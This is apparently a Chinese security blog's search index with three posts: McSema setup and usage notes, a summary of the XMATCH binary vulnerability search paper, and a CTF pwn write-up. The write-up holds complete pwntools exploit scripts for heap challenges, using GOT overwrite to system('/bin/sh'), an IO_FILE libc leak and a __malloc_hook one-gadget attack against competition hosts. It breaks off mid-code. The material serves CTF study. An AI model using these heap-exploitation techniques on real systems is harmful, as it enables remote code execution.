<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Mcsema 学习记录]]></title>
    <url>%2F2020%2F03%2F24%2FMcsema-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[参考https://github.com/lifting-bits/mcsema#using-mcsemahttps://github.com/lifting-bits/mcsema/blob/master/docs/McSemaWalkthrough.mdhttps://blog.trailofbits.com/2017/03/14/mcsema-im-liftin-it/#commentshttps://blog.trailofbits.com/2018/01/23/heavy-lifting-with-mcsema-2-0/ 简介McSema是可执行文件。它将可执行二进制文件从本机代码转换（“提升”）为LLVM位代码。LLVM位码是程序的中间表示形式，最初是为可重新定向的LLVM编译器创建的，但对于执行无法直接在可执行二进制文件上执行的程序分析方法也非常有用。 McSema使分析师能够查找和追溯二进制程序，以解决安全漏洞，独立验证供应商源代码并生成覆盖率高的应用程序测试。McSema不仅用于静态分析。提升后的LLVM位代码也可以使用libFuzzer进行模糊处理，libFuzzer是基于LLVM的检测性模糊器，否则将需要目标源代码。提升的位码甚至可以编译回可运行的程序！这是一个称为静态二进制重写，二进制转换或二进制重新编译的过程。 McSema支持提升Linux（ELF）和Windows（PE）可执行文件，并了解大多数x86和amd64指令，包括整数，X87，MMX，SSE和AVX操作。AARCH64（ARMv8）指令支持正在积极开发中。 使用McSema的过程分为两个步骤：控制流恢复和指令翻译。使用该mcsema-disass工具执行控制流恢复，该工具依赖于IDA Pro，Binary Ninja或DynInst来分解二进制文件并生成控制流图。然后使用该mcsema-lift工具执行指令转换，该工具将控制流程图转换为LLVM位代码。在后台，的指令翻译功能mcsema-lift在remill库中实现。的开发remill是对McSema的重构和改进的结果。 McSema 2.0.0 Remill。现在，指令语义已完全分离到自己的库Remill中。McSema是使用该库进行二进制提升的客户端。举个比喻，McSema代表Remill，Clang代表LLVM。使用Remill寻找将来的项目。 简化的语义。McSema和Remill的分离使添加对新指令的支持变得更加容易。在Remill中，指令语义可以直接用C ++表达，并由Clang自动编译为LLVM位代码 AArch64（64位ARMv8）。使用Remill作为语义后端的转变意味着McSema 2从一开始就支持多种架构。它不仅可以在x86和x86-64二进制文件上运行，而且还支持提升64位ARMv8程序。 SSE3 / 4和AVX支持。McSema现在支持利用高级矢量指令集的提升程序 CFG回收率更高。提升错误的常见根源是控制流恢复能力差。我们改进了控制流恢复过程，使其更简单，更快，更准确。McSema的CFG恢复也开始合并一些高级功能，例如提升全局变量和堆栈变量 Binary Ninja support. McSema现在具有Beta支持，可通过Binary Ninja恢复程序控制流。 安装这里用docker安装，比较省力。但pull的时间比较长，镜像有8.03G。 1docker pull moflow/mcsema pull完了我才发现这个跟github上的不一样 淦 还是用github上的dockerfile来build吧123# 1. wget https://raw.githubusercontent.com/trailofbits/mcsema/master/tools/Dockerfile# 2. docker build -t=mcsema .# 3. docker run --rm -itd --ipc=host -v &quot;$&#123;PWD&#125;&quot;:/home/user/local mcsema 其中我试了很多次都没build成功，这个dockerfile里面有很多坑1、git clone的太慢了简直是龟速， 看了网上的骚操作，把github的项目直接导入到gitee上，然后克隆gitee速度飞起 2、RUN sudo dpkg –add-architecture i386 &amp;&amp; sudo apt-get install zip zlib1g-dev:i386 -y 这句话也错了，要把 sudo 和 :i386去掉 3、更换国内的软件源 RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.list 123456789101112131415161718192021222324252627282930313233343536373839404142# Using this file:# 1. wget https://raw.githubusercontent.com/trailofbits/mcsema/master/tools/Dockerfile# 2. docker build -t=mcsema .# 3. docker run --rm -it --ipc=host -v &quot;$&#123;PWD&#125;&quot;:/home/user/local mcsemaFROM ubuntu:18.04RUN apt-get update &amp;&amp; apt-get upgrade -yRUN apt-get install git curl cmake python2.7 python-pip python-virtualenv wget build-essential gcc-multilib g++-multilib libtinfo-dev lsb-release zlib1g-dev -y# If using IDA for CFG recovery, uncomment the following line:RUN sudo dpkg --add-architecture i386 &amp;&amp; sudo apt-get install zip zlib1g-dev:i386 -y# Set up enviornment in `/home/ToB`WORKDIR /home/ToB# Download everything and set up folder structureRUN git clone --depth 1 https://github.com/lifting-bits/mcsema.git &amp;&amp; \ export REMILL_VERSION=`cat ./mcsema/.remill_commit_id` &amp;&amp; \ git clone https://github.com/lifting-bits/remill.git &amp;&amp; \ cd remill &amp;&amp; \ git checkout -b temp $&#123;REMILL_VERSION&#125; &amp;&amp; \ mv ../mcsema toolsRUN cd remill &amp;&amp; ./scripts/build.shRUN cd remill/remill-build &amp;&amp; make installWORKDIR /home/user################################# Left to reader to install ## their disassembler (IDA/BN) ################################## But, as an example:# ADD local-relative/path/to/binaryninja/ /root/binaryninja/# ADD local-relative/path/to/.binaryninja/ /root/.binaryninja/ # &lt;- Make sure there&apos;s no `lastrun` file# RUN /root/binaryninja/scripts/linux-setup.sh# Allow for mounting of local folderRUN mkdir localCMD /bin/bash 修改版的dockerfile 如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243# Using this file:# 1. wget https://raw.githubusercontent.com/trailofbits/mcsema/master/tools/Dockerfile# 2. docker build -t=mcsema .# 3. docker run --rm -it --ipc=host -v &quot;$&#123;PWD&#125;&quot;:/home/user/local mcsemaFROM ubuntu:18.04RUN sed -i s@/archive.ubuntu.com/@/mirrors.aliyun.com/@g /etc/apt/sources.listRUN apt-get update &amp;&amp; apt-get upgrade -yRUN apt-get install git curl cmake python2.7 python-pip python-virtualenv wget build-essential gcc-multilib g++-multilib libtinfo-dev lsb-release zlib1g-dev -y# If using IDA for CFG recovery, uncomment the following line:RUN dpkg --add-architecture i386 &amp;&amp; apt-get install zip zlib1g-dev -y# Set up enviornment in `/home/ToB`WORKDIR /home/ToB# Download everything and set up folder structureRUN git clone https://gitee.com/nocbtm/mcsema.git &amp;&amp; \ export REMILL_VERSION=`cat ./mcsema/.remill_commit_id` &amp;&amp; \ git clone https://gitee.com/nocbtm/remill.git &amp;&amp; \ cd remill &amp;&amp; \ git checkout -b temp $&#123;REMILL_VERSION&#125; &amp;&amp; \ mv ../mcsema toolsRUN cd remill &amp;&amp; ./scripts/build.shRUN cd remill/remill-build &amp;&amp; make installWORKDIR /home/user################################# Left to reader to install ## their disassembler (IDA/BN) ################################## But, as an example:# ADD local-relative/path/to/binaryninja/ /root/binaryninja/# ADD local-relative/path/to/.binaryninja/ /root/.binaryninja/ # &lt;- Make sure there&apos;s no `lastrun` file# RUN /root/binaryninja/scripts/linux-setup.sh# Allow for mounting of local folderRUN mkdir localCMD /bin/bash 然后又遇到了新问题 RUN cd remill &amp;&amp; ./scripts/build.sh 脚本里面curl 的一个网站被墙了，死活安装不上，又没有找到替代的。淦，科学上网尤为重要 祭出香港云服务器又重新bulid，大约过了半小时才build完。 最后我已经上传到了阿里云上，日常搬运。方便日后下载 1docker pull registry.cn-hangzhou.aliyuncs.com/nocbtm/mcsema:2.0 使用使用mcsema-disassmcsema的CFG恢复部分来恢复xz的控制流。 1mcsema-disass --disassembler〜/ ida-6.9 / idal64 --os linux --arch amd64 --output xz.cfg --binary xz --entrypoint main --log_file xz.log 让我们来看一下每个选项： –disassembler ~/ida-6.9/idal64：这是IDA Pro可执行文件的路径，它将执行大部分拆卸工作。 –os linux：我们要提供的二进制文件适用于Linux操作系统。可以在任何受支持的平台上将mcsema用于任何受支持的二进制文件（例如，可以在Linux上取消Windows二进制文件，反之亦然）。 –arch amd64注意：我们要提升的二进制文件是使用amd64或x86_64指令集的64位二进制文​​件。 –output xz.cfg：将恢复的控制流信息存储在名为的文件中xz.cfg。 –binary xz：xz用作输入二进制 –entrypoint main：指定反汇编程序应从哪里开始恢复控制流。这告诉它使用该main功能作为CFG恢复的起点。 –log_file xz.log：用于存储反汇编日志的位置。这是可选的，但对调试很有帮助，正如我们将在本指南的后面部分看到的那样。 获得程序的控制流信息后，可以使用将其转换为LLVM位代码mcsema-lift-4.0。这4.0是所使用的LLVM工具链的版本。可以将McSema构建为使用LLVM 3.6版及更高版本。 这是将CFG转换为位码的命令： 12mcsema-lift-4.0 --os linux --arch amd64 --cfg xz.cfg --output xz.bc 让我们一一探讨这些选项： –os linux：CFG来自Linux操作系统的二进制文件。当前有效的选项是linux或windows。翻译的某些方面（例如外部功能的ABI兼容性）需要此选项。 –arch amd64：对amd64架构使用指令语义。有效选项包括x86和x86_avx（32位x86语义），amd64和amd64_avx（64位x86）以及aarch64（64位ARMv8）。 –cfg xz.cfg：将输入控制流程图转换为位代码。 –output xz.bc：在哪里写位码。如果–output未指定该选项，则将位代码写入stdout。]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提取用于跨平台漏洞搜索的条件公式]]></title>
    <url>%2F2020%2F03%2F17%2F%E6%8F%90%E5%8F%96%E7%94%A8%E4%BA%8E%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E7%9A%84%E6%9D%A1%E4%BB%B6%E5%85%AC%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[前言本篇文章的主要思想和方法来源于一篇论文https://www.semanticscholar.org/paper/Extracting-Conditional-Formulas-for-Cross-Platform-Feng-Wang/c75d9f1ff9177b26b7681876d7ee810d14401a49虽然不是最新的，但是对于研究漏洞挖掘来学习一下也不错。你可以看作本文是对这篇论文的翻译加提取。 概述随着最近嵌入式系统和IoT设备中安全漏洞的增加，在跨平台环境中直接在二进制可执行文件中搜索漏洞变得越来越重要。但是，在这个领域中几乎没有探索。现有的努力易于产生大量的误报，其结果无法为人类分析家消除这些误报提供可解释的证据。在本文中，我们建议从原始二进制代码中提取条件公式作为高级语义特征，以进行代码搜索。条件公式明确捕获了错误的两个基本因素：1）错误的数据依赖性和 2）缺少条件检查或无效的条件检查。结果是，在条件公式上执行二进制代码搜索可显着提高准确性，并为人类分析人员进一步检查搜索结果提供有意义的证据。我们已经实现了XMATCH原型，并使用包括OpenSSL和BusyBox在内的知名软件对其进行了评估。实验结果表明，XMATCH在准确性方面优于现有的错误搜索技术。此外，通过评估5个最近的漏洞，XMATCH为人类分析人员提供了明确的证据，以确定匹配的候选对象是否确实易受攻击或已被修补。实验结果表明，XMATCH在准确性方面优于现有的错误搜索技术。此外，通过评估5个最近的漏洞，XMATCH为人类分析人员提供了明确的证据，以确定匹配的候选对象是否确实易受攻击或已被修补。实验结果表明，XMATCH在准确性方面优于现有的错误搜索技术。此外，通过评估5个最近的漏洞，XMATCH为人类分析人员提供了明确的证据，以确定匹配的候选对象是否确实易受攻击或已被修补。 问题描述我们以真实漏洞CVE- 2013 -6449为例。图1说明了x86和MIPS的ssl_get_algorithm2的两个二进制函数。x86版本是从OpenSSL库(版本1.0. la)编译而成的，而MIPS版本是从基于Linux的路由器固件DD-WRT (版本r21676) 中直接提取的。这两个代码段均包含漏洞CVE-2013- 6449，该漏洞使远程攻击者可以通过来自TLS 1. 2客户端的特制流量发起拒绝服务攻击(守护程序崩溃)。在此示例中，向我们提供了x86的易受攻击的函数ssl_get_algorithm2,我们旨在从路由器固件中搜索剥离后的二进制文件中的同一易受攻击的函数，并根据匹配结果确定每个匹配的候选对象是否确实易受攻击:误报或已应用于脆弱功能的补丁。图1：在不同架构（x86与MIPS）下易受攻击的函数ssl_get_algorithm2（CVE-2013-6449）的控制流程图比较。 从这个例子中，我们观察到跨平台二进制代码搜索的一些挑战: 句法表示形式非常不同。x86和MIPS具 有完全不同的指令集。他们采用不同的策略来传递函数参数: x86通 常是放大堆栈以传递参数，而MIPS将参数保存在特殊寄存器中。此外，它们使用不同的机制进行条件分支: x86 .依赖于隐式EFLAGS寄存器，而MIPS则不依赖。 如图1所示，指令语法和指令计数有很大不同。因此，任何基于表面特征(例如，操作码类型和数量）的代码搜索技术都可能不会产生非常好的准确性。 控制流图不一致。在两个平台上编译的相同函数的控制流图非常不同的结构。在图1中，虽然x86二进制文件包含4个基本块，但NIPS功能却包含5个基本块。此类CFG更改可能会成为先前代码搜索工作的重要障碍,这依赖于基本决级别的特征提取和语义比较。相反,为了解决此问题，我们建议使用基于行为的高级语义来搜索安全性错误，包括数据依赖性和分支谓词。这些因素揭示了基本的程序行为，而不是易失的代码形成，因此对CFG级别的结构变化不敏感。 易受攻击的代码逻辑通常分散在多个基本块中。图1中所示的漏洞是由于对ssl_get_algorithm2参数的版本检查不正确引起的， 但是此代码逻辑跨越多个基本块，并与其他代码逻辑合。因此，要精确定位并确认此漏河，就像先前的工作一样，不足以匹配各个基本块。相反，有必要将涉及多个基本块的滑河作为一个整体来考虑并重新构建。 解决方法我们在图2中概述了我们的方法。它包括以下三个步骤:二进制提升，条件公式提取和条件公式匹配。二进制提升。我们首先利用二进制提升将不同的本地机器代码转换为相同的更高级别的中间表示(IR)。提升后的二进制文件保留与原始二进制程序一致的语义。 我们随后的操作将直接在提升后的二进制文件上进行。条件公式提取。我们对提升后的二进制应用二进制分析技术来构造条件公式。我们通过指针仔细处理数据依赖性。此外，并非所有提升二元函数中的变量都有意义。我们进行动作点选择以过滤不相关的变量。条件公式匹配。我们通过函数的统一条件公式对其进行匹配。我们将匹配问题建模为线性分配问题，并利用编程技术来找到最住解决方案。然后，除了简单的相似性得分外，匹配结果还和CF的一对一映射。因此，分析人员可以检查深度映射结果，以了解和验证任何发现的错误。 图2：输入是实现x86和MIPS的ssl_get_algorithm2函数的二进制文件，其中包含漏河CVE 2013-6449。首先,将两个二进制文件提升为中间表示(IR)。第二，从提升的二元函数中提取条件公式。最后，条件匹配适用于相似度得分，并输出一对一的映射结果。 二进制提升二进制提升将不同体系结构的二进制代码转换为通用代码表示形式，以方便后续分析。我们需要为一个函数提取条件公式，这种转换必须保留整个函数的语义。为此，我们首先恢复功能的控制流程图，然后按照控制流程图对指令进行二进制转换。关于实现，我们的二进制提升基于McSema， 一种代码转换框架，可将x86指令转换为LLVW IR (中间表示)。为了解决跨平台错误搜索的问题，我们在两个方面扩展了Mc-Sema: 1) 多体系结构支持; 2)基于功能原型的翻译。 McSema支持多种架构McSema提供了一个通用框架，使我们能够轻松支持其他指令集。在当前的XMATCH实现中，我们扩展了对MIPS的支持，因为它是流行的CPU架构，嵌入式系统和IoT设备的架构。 McSema需要两个步骤来转换二进制函数: 1) 控制流程图恢复，以及2)生成位代码。控制流程图恢复将分解一个二进制函数，检索其基本块以及这些基本块之间的控制流依赖性。生成位码将遍历控制流程图，进行一对一 的指令转换并生成LLV位码文件。我们利用IDA Pro来检索MIPS二进制函数的控制流程图。McSema通过对每个指令的执行语义进行建模，将每个指令转换为x86二进制文件。我们遵循类似的指令翻译过程。MIPS属于RISC指令集，因此在McSema中添加这种支持的工作量比添加对x86等CISC指令集的支持要简单得多。在我们的案例中，我们在McSema中添加的0C少于1K,这是一次性的工作。 基于功能原型的翻译对于函数调用翻译，McSema引入了全局“con-test registers”数据类型，并将其用作所有提升函数的唯一参数。“con-test registers”包括以下所有寄存器相应的CPU架构。在解除功能的开始，MeSena首先分配几个局部变量，然后将全局“con-test registers”参数中的所有寄存器溢出到这些变量中。然后，基于变量执行以下操作。当函数返回时，“con-test registers”将包含最新的变量值。在每个函数调用站点，这意味着将调用提升的函数，首先包装“con-test registers”，然后将其作为唯一参数传递给被调用方。结果，McSema可以保留功能之间的控制和数据流依赖性，而无需执行功能原型恢复。但是，这种翻译策略将削弱XMATCH的功效。首先，在没有函数原型恢复的情况下，生成的条件公式无法在函数的实参上表示执行语义，因为某些缺陷代码逻辑可能与函数调用(例如nemcpy).上 的实参有关。其次，统一函数原型将降低XMATCH的准确性，因为我们不能依靠参数的数量来进一步优化搜索结果。为了解决.上面讨论的这些问题，我们要求McSena根据函数原型翻译函数调用指令。更具体地说，可通过三个步骤来实现此目标: 函数原型恢复 函数调用转换 参数传递模型 我们首先恢复二进制函数的函数原型，然后基于恢复的函数原型在McSema中修改函数调用转换机制。我们还添加了其他IR指令,以对传递给相应呼叫站点的参数进行建模。 函数数原型包括函数名称，其参数和返回值。我们利用IDApro来获取恢复的功能原型。与许多其他功能原型算法和平台相比，IDA pro可能具有局限性。但是，它是用户友好的，并且支持多个平台。此外，我们的实验表明，这足以满足我们的实验目的。将来，我们将采用更强大的方法进行进一步的改进。 我们在函数调用上分配所有函数-翻译期间返回值的站点。我们将在生成条件公式中进行筛选过程，以减少虚假回报值对生成的条件公式的影响。 当McSema翻泽函数调用指令时，它将预先定义要翻译的参数数量。在其原始设计中，它始终假定参数数目为1。在我们的sce-nario中，参数数目由恢复的函数原型定义。我们创建的参数变量具有在函数原型中定义的相同数量的参数。我们还为每个提升的函数创建了返回变量。 由于在MeSema中已更改了函数调用指令的转换，因此我们还需要添加相应的参数传递指令，以保留调用者函数与其被调用者之间的数据流依赖性。对参数传递进行建模取决于原始二进制函数的调用约定类型。我们通过调用约定的类型对它们进行建模，并通过匹配我们的建模模式来检查调用约定的类型。对于调用约定类型，我们在函数调用指令之前添加传递IR指令的相应参数。 图3显示了如何在x86和MIPS架构上转换的具体示例。在此示例中，根据IDA中的分析，我们知道功能栏具有两个参数，因此在呼叫站点，呼叫栏和ja1栏将被翻译为多个IR指令，如图所示。数字。调用指令之前的指令描述了如何将参数传递给相应的函数。 其他问题McSema不支持各种x86指令的翻译。例如，它仅支持-小部分浮点指令。但是，McSema有据可查， 并且为所需的其他说明添加支持并不困难。在这种情况下，对我们而言，为条件公式提取所必需的条件分支提供支持非常重要，因此我们]添加了McSema不支持的这种浮点指令的支持。我们相信支持所有说明是工程工作，并将其留作未来工作。 条件公式提取我们直接对提升函数进行静态分析，以提取其条件公式。更具体地说，我们进行过程内数据流分析以构造动作公式，并执行路径切片以检索相应条件。所有静态分析都是在LLVM框架之上进行的。 动作构建动作是特定R变量上的数据流方程，用作函数输山。为了构造一个动作，我们首先发现所有具有外部影响的函数输出(我们称它们为“动作点”)。然后，从每个动作点开始，我们计算ust def链以评估从函数输出到输入的可达性。最終，我们将每条迹线上的所有IR语句折叠起来，以产生-一个数据流万程，作为对相应动作点的动作。动作点选择。直观地。我们可以为函数中托管的任何IR变量计算数据流方程。但是，提升函数仍然保留许多体系结构特定的变量，例如图5n)中的ESP val和图5b)中的a0 valo这将使生成的条件公式在整个体系结构中截然不同。因此,我们仅关注稳定的输出状态，这些状态表示一致的程序行为。为此，我们旨在从三种类型的函数输出中计算反向数据流:1)返回值: 2) 内存变量; 3) 函数调用。 1)返回值。即使我们假设提升的二进制文件中的所有函数在第3.2节中讨论的二进制提升过程中都具有返回值，我们也会进行保守分析以识别持有这回值的变量。首先，我们寻找具有特定寄存器名称的IR变量。这是由于这样的事实，即某种体系结构使用特定的寄存器来保存返回值和IR变量(尽管从二进制中取出)仍保留了原始寄存器名称。第二，在这些候选变量中，我们进一步搜索那些从未在同一函数中重新定义的变量。然后，我们考虑这些变量包含返回值。 2)内存变量。函数也可以写入内存。这将转换为提升双字节的存储器写操作。因此，我们通过首先搜索LLVM IR中的存储器写指令storeinst来获得存储器变量。接下来，我们执行值集分析。以确定指针指向的内存区域。一旦未在函数中更新存储区域。则其指针现在指向实际输出。因此可以将其视为动作点。 3)函数调用。一个函数可以调用另一个函数。如果调用方函数性用或检查被调用方函数的这回值，则被调用方函数最终将包含在使用该返回值的变量的数据流表达式中。如果在调用者函数中从未使用过call函数的返回值，则将其视为操作点。 条件提取我们进一步利用路径切片算法(JHALA,MAJUNDAR)为每个动作生成条件。在我们的方案中，路径切片用于提取在其中保存操作的特定路径的条件取消二进制功能。给定操作和计算出的数据流，我们将切片标准设置为在操作中包括所有变量。根据切片标准，路径切片算法将向后追潮，以找到包含切片标准中所有变量的路径切片。我们从路径切片中提取所有比较变量并为这些变量生成请词表达式。每个pred-icate表达式包括条件表达式及其布尔值，这些值将导致动作被执行。在LLWI- IR中，如果它是条件跳转，则比较变量是分支指令的第一个操作数。 我们为条件变量生成数据流方程，以获取此基本块上的条件表达式我们可以通过检查成功获取布尔值-路径上的块。如果其地址是分支变量的第二个操作数。则布尔值为true。否则为假。如果布尔值是false,我们将否定条件表达式。我们将在路径切片上发现的清词表达式作为动作v的条件进行结合。 运行示例。图7展示了eax动作的条件生成过程。图7(a)列出了针对eax的两个操作: a0+2和a0+1。这表明eax可以根据要采用的数据流路径保留两个不同的值。图7 (b)显示.了两个动作的路径标准，每个动作都涉及3个IR变量。在图7(b)中也显示了相应的操作路径切片。这些切片不仅包括数据流。还包括所有条件。然后，我们可以演历这些路径切片，提取所有分支变量，并对其数据流方程进行组合。结果成为执行此操作的条件。动作a0 + 1和a0 + 2的条件生成输出在图7 (e)中列出。 条件公式匹配我们通过两个还数的条件公式进行匹配。它包括两个步骤。首先，我们计算两个的匹配成本CFs。其次，我们寻求CF之间的最佳匹配s由se-选择两组CF之间的最小匹配成本s和然后输出两个函数的相似度得分。直观上，可以利用字符串编辑距离来计算两个CF之间的匹配成本。但是，由于顺序不同，两个语义上等效的CF可能看起来是不同的。例如，( (a&gt; 0) &amp; (b&gt; 0) ) /ret0x20800将被视为与((b&gt;0)&amp;(a&gt;0))/ret=0x20800不相等，即使它们具有相同的行为级别的义。因为具有通信属性。为了避免重新排序问题，我们改为过其AST结构匹配两个CF。由于AST是树状结构,因此我们用图形编辑距离来计算在两个CF之间转换的成本。 我们利用算法[38]计算图形编辑距离ged (cfi, ecfj) 。在我们的情况下，并非所有节点都可以互换。例如，条件相关节点不能被动作相关节点代替。因此，在预先计算的映射成本矩阵算法中，我们为动作节点和条件芒点之间的映射成本分配了无限数。然后，使用两个CF的距离来计算两个函数的匹配成本。假设我们给了两个函数f1和f2,其中f1包含CF集[cf1。ef2, 。.. efn}和f2拥有集合1c 1,。… cfm).令mij为CF对的匹配因子:如果efi匹配ef，则u1j = 1;否则，mij=0。 因此，所有匹配因子形成一个匹配矩阵Mn × m，这说明了这两个函数如何相互对应。根据图形编辑距离。我们定义函数distance作为f1之间所有匹配的CF对的最小距离和f2。如我们所见，找到函数距离等于，找到最小的M(i，j)1小distlet. 。在换句话说。我们需要找到最佳匹配(最小匹配距离)之间的距离。请注意，由于贪婪方法只能产生次优的解决方案。因此无法单独使用每个函数中的CF的贪婪方法。寻找最优解，我们制定以下目标函数:(1) 是计算匹配的CF对之间的距离，并最小化该值。表示功能中每个CF的约束只能匹配一次。基于等式(1)，我们可以正式介绍函数距离。定义fl和f2的函数距离是fl和f2之间所有匹配的CF对的最小距离。令M代表方程的最佳解。 [38] Y. David, N. Partush, and E. Yahav, ‘‘Statistical similarity of binaries,’’ACM SIGPLAN Notices, vol. 51, no. 6, pp. 266–280, 2016.]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高校战“疫”网络安全分享赛 pwn 复现]]></title>
    <url>%2F2020%2F03%2F09%2F%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[easyheap程序没开PIE，got表可写 漏洞点ptr[v1]清零了，但*(void **)ptr[v1]没有清零。123456789101112131415int sub_4009E4()&#123; int v1; // [rsp+Ch] [rbp-4h] if ( ++dword_6020AC &gt; 4 ) return puts(&quot;Delete failed.&quot;); puts(&quot;What is the index of the item to be deleted?&quot;); v1 = sub_400890(); if ( v1 &lt; 0 || v1 &gt; 6 || !ptr[v1] ) return puts(&quot;Delete failed.&quot;); free(*(void **)ptr[v1]); free(ptr[v1]); ptr[v1] = 0LL; return puts(&quot;Delete successfully.&quot;);&#125; 思路首先申请俩次堆块都是0x10，然后free掉，看到add函数里是先进行malloc(0x10)，然后在做check，然后再申请check(0x400)，所以由于free之后会残留指针，在free掉俩个堆块之后，故意输入大数字让他check size fail直接返回，然后申请一个0x10的堆块就可以实现堆块重叠。通过edit前俩次的堆块来覆盖最后一次malloc的堆块的ptr指针来指向chunk_list的位置，然后伪造chunk结构指向got，并且show一下就可以知道libc了，然后修改free_got为system然后free一个内容为/bin/sh的堆块就可以开启shell。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import syscontext.log_level = &apos;debug&apos;#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]if sys.argv[1]==&quot;l&quot;: io=process(&apos;./easyheap&apos;) lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: io=remote(&apos;121.36.209.145&apos;,9997) lib=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)elf=ELF(&apos;./easyheap&apos;)def choice(idx): io.sendlineafter(&apos;Your choice:\n&apos;, str(idx))def add(size, content): choice(1) io.sendafter(&apos;this message?\n&apos;, str(size)) if size&lt; 0x400: io.sendafter(&apos;content of the message?\n&apos;, content)def dele(idx): choice(2) io.sendlineafter(&apos;deleted?\n&apos;,str(idx))def edit(idx, content): choice(3) io.sendlineafter(&apos;modified?\n&apos;,str(idx)) io.sendafter(&apos;message?\n&apos;, content)# ------------------------------------------------onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]chunk_list=0x6020C0# ------------------------------------------------add(0x18,0x18 * &quot;\x10&quot;) #0add(0x18,0x18 * &quot;\x11&quot;) #1dele(0)add(0x500,&apos;&apos;)dele(1)add(0x500,&apos;&apos;)add(0x18,0x18 * &apos;\x12&apos;) #2edit(1,p64(0) + p64(0x18) + p64(chunk_list))edit(2,p64(chunk_list + 8) + p64(chunk_list))edit(0,p64(chunk_list + 8) + p64(chunk_list) + p64(chunk_list + 0x18) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;__libc_start_main&apos;]) + p64(chunk_list + 0x30) + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;free&apos;]))edit(2,p64(elf.plt[&apos;puts&apos;]))dele(4)__libc_start_main = u64(io.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&apos;\x00&apos;))libc = __libc_start_main - lib.symbols[b&apos;__libc_start_main&apos;]lib.address = libcsystem = lib.symbols[&apos;system&apos;]binsh = lib.search(&quot;/bin/sh\x00&quot;).next()__dele_hook = lib.symbols[&apos;__free_hook&apos;]__malloc_hook = lib.symbols[&apos;__malloc_hook&apos;]__realloc_hook = lib.symbols[&apos;__realloc_hook&apos;]edit(5,p64(system))edit(0,p64(chunk_list + 8) + p64(binsh))dele(0)io.interactive() woodenbox2got表可写，其余保护全开 漏洞点change_item()函数里面没有对size做限制，堆溢出。 思路题目难点在于没有输出功能，需要打io_file泄露libc基址。然后fastbin attack 打malloc_hook,这里onegadget失效，用realloc 调整偏移即可。iofile泄露原理可参考EX师傅博客http://blog.eonew.cn/archives/1190 exp成功率 16分之一1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *import sys#context.log_level = &apos;debug&apos;#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]def exp(): try: if sys.argv[1]==&quot;l&quot;: io=process(&apos;./woodenbox2&apos;) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) else: io=remote(&apos;121.36.215.224&apos;,9998) libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) elf=ELF(&apos;./woodenbox2&apos;) def choice(idx): io.sendlineafter(&apos;Your choice:&apos;, str(idx)) def add(size, content): choice(1) io.sendlineafter(&apos;:&apos;, str(size)) io.sendafter(&apos;:&apos;, content) def free(idx): choice(3) io.sendlineafter(&apos;:&apos;,str(idx)) def edit(idx,size, content): choice(2) io.sendlineafter(&apos;:&apos;,str(idx)) io.sendlineafter(&apos;:&apos;,str(size)) io.sendafter(&apos;:&apos;, content) # ------------------------------------------------ iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157 onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147] # ------------------------------------------------ add(0x20,&apos;aaaa&apos;)#0 add(0x40,&apos;aaaa&apos;)#1 add(0x60,&apos;aaaa&apos;)#2 add(0xa0,&apos;aaaa&apos;)#3 edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1)) free(1) #1 free(1) #2 add(0x40,&apos;bbbb&apos;) #0 edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0])) add(0x60,&apos;aaaa&apos;) # 2 add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3 io.recv(0x40) leak=u64(io.recv(8)) info(hex(leak)) libc.address = leak-(0x7f35bc64a600-0x7f35bc285000) log.success(hex(libc.address)) malloc_hook = libc.sym[&apos;__malloc_hook&apos;] free_hook = libc.sym[&apos;__free_hook&apos;] one = libc.address+onegadgets[1] log.success(hex(malloc_hook)) add(0x60,&apos;cccc&apos;)#4 add(0x60,&apos;dddd&apos;)#5 free(5) edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23)) add(0x60,&apos;bbbb&apos;) add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13)) choice(1) io.sendlineafter(&apos;:&apos;, str(60)) io.interactive() except Exception as e: print(e) io.close()while True: exp() bjutgot表可写，pie没开 漏洞点show 和 edit功能，可以输入负数，造成数组上溢。12345678910111213141516171819unsigned __int64 edit()&#123; int v1; // [rsp+4h] 